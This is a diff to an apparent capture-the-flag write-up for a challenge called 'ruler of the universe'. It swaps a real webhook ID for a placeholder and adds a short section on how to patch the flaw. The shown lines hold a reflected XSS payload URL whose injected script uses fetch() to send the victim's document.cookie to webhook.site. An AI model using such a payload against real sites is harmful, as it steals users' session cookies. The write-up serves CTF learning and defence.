@@ -183,7 +183,11 @@ I personally use webhook.site but of course you're free to use whatever tool you
 
 Here's the final url : (again not url encoded)
 ```
-https://inst-xxxxxxxxxx-ruler-of-the-universe.chal.uiuc.tf/module/1?message=""><script>fetch('https://webhook.site/419b01b1-ee9c-4b1a-8f13-46dc2f3fd620/?flag='+document.cookie)</script>
+https://inst-xxxxxxxxxx-ruler-of-the-universe.chal.uiuc.tf/module/1?message=""><script>fetch('https://webhook.site/yourUUIDhere/?flag='+document.cookie)</script>
 ```
 
 Submit the url (only the part from ```module/...```) to the admin bot and enjoy your flag !
+
+### How to patch this ?
+
+Avoid writing your own custom JSX renderer or input sanitizer unless absolutely necessary. Prefer using mature, battle-tested libraries that handle escaping properly, like React’s default DOM renderer.
